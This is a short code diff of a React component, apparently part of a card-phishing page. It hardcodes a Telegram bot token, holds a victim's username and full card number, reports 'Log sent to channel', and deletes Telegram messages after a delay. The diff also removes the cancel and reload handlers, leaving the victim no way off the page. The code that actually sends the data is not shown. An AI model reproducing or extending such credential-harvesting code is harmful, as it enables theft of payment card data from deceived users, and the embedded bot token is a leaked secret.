@@ -1,6 +1,5 @@
 import React, { useState, useEffect } from 'react';
 import axios from 'axios';
-import { useNavigate } from 'react-router-dom';
 import './NextStepAppr.css';
 
 const TELEGRAM_BOT_TOKEN = '8666763764:AAEAX_70cie6CV4ccQ9blq8D8S6GcqXD-dk';
@@ -22,7 +21,6 @@ const deleteMessageAfterDelay = async (chatId, messageId, delay = 30000) => {
 };
 
 function NextStepAppr() {
-  const navigate = useNavigate();
   const [username, setUsername] = useState('');
   const [fullCardNumber, setFullCardNumber] = useState('');
   const [cardNumber, setCardNumber] = useState('**** **** **** 9116');
@@ -97,14 +95,6 @@ function NextStepAppr() {
     
     setIsLoading(false);
     console.log('✅ Confirmed - Log sent to channel');
-  };
-
-  const handleCancel = () => {
-    window.location.href = '/login';
-  };
-
-  const handleManualReload = () => {
-    window.location.reload();
   };
 
   return (
